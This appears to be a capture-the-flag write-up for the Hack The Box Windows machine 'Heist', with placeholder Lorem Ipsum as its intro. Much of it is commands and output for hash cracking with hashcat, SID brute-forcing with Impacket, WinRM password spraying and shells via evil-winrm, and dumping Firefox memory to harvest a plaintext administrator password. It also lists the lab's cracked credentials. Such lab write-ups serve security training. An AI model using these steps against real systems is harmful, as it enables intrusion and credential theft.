---
layout: single
title: Heist - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-09-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-heist/heist_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-heist/heist_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

NOTE: Working credentials found during enumeration
  rout3r / $uperP@ssword
  admin / Q4)sJu\Y8qz*A3?d
  hazard / stealth1agent
  Chase / Q4)sJu\Y8qz*A3?d
  Administrator / 4dD!5}x/re8]FBuZ

1. nmap -Pn -p- -O 10.10.10.149
    80/tcp    open  http
    135/tcp   open  msrpc
    445/tcp   open  microsoft-ds
    5985/tcp  open  wsman
    49669/tcp open  unknown
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

2. Enum port 80, login as Guest User and you'll see user Hazard post an attached file containing 2 usernames and 3 password.
    enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
    username rout3r password 7 0242114B0E143F015F5D1E161713
    username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

3. Crack all (3) the hashes.
    Password 7 types can easily be cracked using:
    http://www.ifm.net.nz/cookbooks/passwordcracker.html
    Which gives us following two creds
      rout3r / $uperP@ssword      (0242114B0E143F015F5D1E161713)
      admin / Q4)sJu\Y8qz*A3?d    (02375012182C1A1D751618034F36415408)

    Password 5 is a md5crypt and can be cracked using hashcat and rockyou.txt.
    To find the correct Hash Mode (-m 500) see https://hashcat.net/wiki/doku.php?id=example_hashes
      root@p3:/opt/htb/machines/heist# echo "$1$pdQG$o8nrSzsGXeaduXrjlvKc91" > cisco-hash.txt
      root@p3:/opt/htb/machines/heist# hashcat -a 0 -m 500 cisco-hash.txt /usr/share/wordlists/rockyou.txt -o cisco-cracked.txt --force
      root@p3:/opt/htb/machines/heist# cat cisco-cracked.txt
        $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent

    Possible Usernames:
      root@p3:/opt/htb/machines/heist# cat heist-users.txt
        admin
        rout3r
        hazard

    Possible Passwords:
      root@p3:/opt/htb/machines/heist# cat heist-pws.txt
        $uperP@ssword
        Q4)sJu\Y8qz*A3?d
        stealth1agent


4. Enumerate / Brute Windows SID through MSRPC with lookupsid.py from Impacket, using found credentials.
    root@p3:/opt/impacket/examples# ./lookupsid.py hazard:stealth1agent@10.10.10.149
      Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

      [*] Brute forcing SIDs at 10.10.10.149
      [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
      [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
      500: SUPPORTDESK\Administrator (SidTypeUser)
      501: SUPPORTDESK\Guest (SidTypeUser)
      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
      513: SUPPORTDESK\None (SidTypeGroup)
      1008: SUPPORTDESK\Hazard (SidTypeUser)
      1009: SUPPORTDESK\support (SidTypeUser)
      1012: SUPPORTDESK\Chase (SidTypeUser)
      1013: SUPPORTDESK\Jason (SidTypeUser)

5. Extend user-list with all new users, and run user/pass through msf auxiliary(scanner/winrm/winrm_login)
    root@p3:/opt/htb/machines/heist# cat heist-users.txt
      admin
      rout3r
      hazard
      Administrator
      Guest
      DefaultAccount
      WDAGUtilityAccount
      support
      Chase
      Jason

    msf5 auxiliary(scanner/winrm/winrm_login) > run
      [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\Chase:Q4)sJu\Y8qz*A3?d

6. Download Winrm Shell or Evil-Winrm and login with user Chase
    https://github.com/Hackplayers/evil-winrm     (More manageable user interface; easy upload and download of files)
    https://alionder.net/winrm-shell/             (Lightweight shell script, would not use for root)

    root@p3:/opt/shells# ruby winrm_shell.rb
    PS > whoami
      supportdesk\chase
    PS > pwd

      Path
      ----
      C:\Users\Chase\Documents


    PS > cd ../Desktop
    PS > type user.txt
      a12*****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate and find an odd running process.
    root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d' -s '/opt/PowerSploit/Exfiltration/'
    *Evil-WinRM* PS C:\Users\Chase\Documents> Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id

      ProcessName           Id
      -----------           --
      ..
      explorer            5620
      firefox              704
      firefox             1296
      firefox             3056
      firefox             3504
      firefox             3832
      fontdrvhost          800
      ..

2. Firefox is an odd service to be running on a HTB box, dump the process memory and see if we can grab anything useful.

    Process dump via ProcDump.exe:
    (https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
    New-Item -Path "C:\Users\Chase\Documents" -Type directory -Force
    cmd.exe /c "C:\Users\Chase\Documents\procdump.exe" -ma 704 -accepteula "C:\Users\Chase\Documents"

    Process dump via PowerSploit tool Out-Minidump:
    (https://github.com/PowerShellMafia/PowerSploit)

    *Evil-WinRM* PS C:\Users\Chase\Documents> upload ../PowerSploit/Exfiltration/Out-Minidump.ps1 C:\Users\Chase\Documents
    *Evil-WinRM* PS C:\Users\Chase\Documents> Import-Module C:\Users\Chase\Documents\Out-Minidump.ps1
    *Evil-WinRM* PS C:\Users\Chase\Documents> Get-Process firefox | Out-Minidump
      Directory: C:\Users\Chase\Documents

      Mode                LastWriteTime         Length Name
      ----                -------------         ------ ----
      -a----        10/2/2019   1:29 PM      524489927 firefox_704.dmp
      -a----        10/2/2019   1:29 PM      273600541 firefox_1296.dmp
      -a----        10/2/2019   1:29 PM      302068992 firefox_3056.dmp
      -a----        10/2/2019   1:29 PM      286191273 firefox_3504.dmp
      -a----        10/2/2019   1:29 PM      385076763 firefox_3832.dmp

3. Search the .dmp-file for credentials.
    Remotely on victim machine:
    *Evil-WinRM* PS C:\Users\Chase\Documents> Select-String -Path firefox_1296.dmp -Pattern login_password
      localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login

    Locally on attacking machine:
    *Evil-WinRM* PS C:\Users\Chase\Documents> download firefox_1296.dmp
      Info: Downloading firefox_1296.dmp to firefox_1296.dmp
      Info: Download successful!
    root@p3:/opt/evil-winrm# strings firefox_1296.dmp | grep login_password
      MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

4. Enter the newfound password in your password list and enumerate wimrm using mfs module auxiliary/scanner/winrm/winrm_login
    msf5 auxiliary(scanner/winrm/winrm_login) > run
      [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\Administrator:4dD!5}x/re8]FBuZ
      [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\Chase:Q4)sJu\Y8qz*A3?d

5. Login with new Administrator creds and get root.txt
    root@p3:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'

      Info: Starting Evil-WinRM shell v1.7
      Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
      supportdesk\administrator
    *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
      50d****************************
